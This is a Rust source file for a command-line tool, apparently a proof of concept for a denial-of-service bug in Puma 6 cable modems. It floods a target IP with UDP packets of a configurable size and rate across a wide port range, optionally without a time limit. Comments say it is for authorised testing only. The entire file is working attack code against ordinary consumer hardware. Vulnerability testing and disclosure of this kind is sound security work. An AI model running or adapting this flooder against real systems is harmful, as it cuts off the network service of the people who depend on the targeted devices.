// This program is only for use in testing a puma 6 denial of service bug
// Do not use this program without permission from the owner of the target IP
// Attacking a system without permission is illegal in most countries
// and also not very nice

extern crate time;

use std::env;
use std::net::UdpSocket;
use std::thread;
use std::time::Duration;

use std::net::{Ipv4Addr, SocketAddrV4, Ipv6Addr, SocketAddrV6, SocketAddr};

fn main() {
	let args: Vec<_> = env::args().collect();
	let mut target = "0.0.0.0";
	let mut length = 0usize;
	let mut mbper_second = 1f32;
	let mut port_range = 50000;
	let mut run_seconds = -1;
	let mut ipv4 = Ipv4Addr::new(0, 0, 0, 0);
	let mut ipv6 = Ipv6Addr::new(0, 0, 0, 0, 0, 0, 0, 0);
	let mut is_ipv6 = false;

	println!("usage: ./puma6_fail <target ip={}> <payload length={}> <mbps={}> <ports={}> <run seconds={}>", target, length, mbper_second, port_range, run_seconds);

	if args.len() <= 1 {
		println!("A target IP must be given");
		return;
	}

	// parse target IP
	target = args[1].as_str();
	let parse_ipv4 = target.parse::<Ipv4Addr>();
	if parse_ipv4.is_err() {
		// probably IPv6
		ipv6 = target.parse::<Ipv6Addr>().expect("invalid IP");
		is_ipv6 = true;
	} else {
		ipv4 = parse_ipv4.unwrap();
	}

	if args.len() > 2 {
		length = args[2].as_str().parse::<usize>().expect("invalid packet size")
	}

	if args.len() > 3 {
		mbper_second = args[3].as_str().parse::<f32>().expect("invalid speed")
	}

	if args.len() > 4 {
		port_range = args[4].as_str().parse::<u16>().expect("invalid port count")
	}

	if args.len() > 5 {
		run_seconds = args[5].as_str().parse::<i32>().expect("invalid run seconds");
	}

	let socket_addr;
	if is_ipv6 {
		socket_addr = SocketAddr::V6(SocketAddrV6::new(Ipv6Addr::new(0, 0, 0, 0, 0, 0, 0, 0), 10000, 0, 0));
	} else {
		socket_addr = SocketAddr::V4(SocketAddrV4::new(Ipv4Addr::new(0, 0, 0, 0), 10000));
	}

	let source = UdpSocket::bind(socket_addr).expect("couldn't bind to address");;
	let data = vec![0; length as usize];
	let per_second = (1024f32 * 1024f32 * mbper_second) / 8f32;
	let udp_length = length + 28;
	let ethernet_length = udp_length + 26;
	let packets_per_millisecond = (per_second / (udp_length as f32))/1000f32;
	let pps = packets_per_millisecond*1000f32;
	println!("Sending {} UDP pps, {} bytes payload, {} bytes IP, {} bytes ethernet, to {} ports at {}", pps, length, udp_length, ethernet_length, port_range, target);
	println!("mbps IP traffic: {}, mbps ethernet traffic: {}", pps*(udp_length as f32)/(1024f32*1024f32/8f32), pps*(ethernet_length as f32)/(1024f32*1024f32/8f32));

	let start = time::PreciseTime::now();
	let mut count = 0;
	loop {
		for port in 10000..(10000 + port_range) {
			let result;
			if is_ipv6 {
				result = source.send_to(&data, SocketAddr::V6(SocketAddrV6::new(ipv6, port, 0, 0)));
			} else {
				result = source.send_to(&data, SocketAddr::V4(SocketAddrV4::new(ipv4, port)));
			}
			if result.is_err() {
				println!("Failed to send packet. {}", result.unwrap_err());
			}

			count = count + 1;
			let elapsed = start.to(time::PreciseTime::now()).num_milliseconds();
			if run_seconds > 0 && elapsed > run_seconds as i64 * 1000i64 {
				println!("run seconds exceeded, stopping");
				return;
			}
			if count as f32 / packets_per_millisecond > (elapsed as f32) {
				thread::sleep(Duration::from_millis(2));
			}
		}
	}
}
